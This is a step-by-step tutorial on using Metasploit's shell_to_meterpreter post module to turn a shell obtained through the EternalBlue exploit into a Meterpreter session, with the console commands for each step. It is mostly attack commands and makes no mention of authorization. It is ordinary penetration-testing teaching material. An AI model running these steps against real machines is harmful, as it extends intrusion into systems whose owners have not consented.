# Getting a Shell to a Meterpreter Session in Metasploit

## This is a quick guide for anyone looking to upgrade their shell to meterpreter in the Metasploit framework

### To accomplish this, you will first need to establish a session using an exploit on the target system.

### So let's assume that you've successfully exploited the target and have the following on the command line

```
C:\Windows\system32 >
```

### Great work! Now we need to upgrade this regular shell to meterpreter. 
### First we need to background the session with, _CRTL+Z_ and when prompted type _y_ and press ENTER. This will background the session
### With the session backgrounded, the command prompt should look similar to this:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

### If you want to check the background session, simply type:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

### And active sessions will be shown with Id, Name, Type, Information, and Connection displayed.

### Now on the Metasploit command prompt search:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
```

### A list will be generated from which you will choose which module best fits your situation. To select one of the choices, simply type:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0 (or whichever number you decide)
```

### Your prompt will change to something like:

```
msf6 post(multi/manage/shell_to_meterpreter) >
```

### Now we need to run the show options command. 

```
msf6 post(multi/manage/shell_to_meterpreter) > show options
```

### You'll notice _SESSION_ is required. From the previous "sessions" command we know which session we want to set here. Type:

```
msf6 post(multi/manage/shell_to_meterpreter) > set session 1
```

### Always double check to make certain the parameter has been set by running the _show options_ command again. With the SESSION parameter set, type:

```
msf6 post(multi/manage/shell_to_meterpreter) > exploit (or run)
```

### This will open a new session. To list the sessions type:

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l 
```

### You should have 2 sessions, the session with the normal shell and the session with the meterpreter shell. To access the meterpreter shell, type:

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
```

### You will now get the meterpreter shell and your command line prompt will change to the following:

```
meterpreter >
```

### You should now be able to run commands where on the previous shell you couldn't.
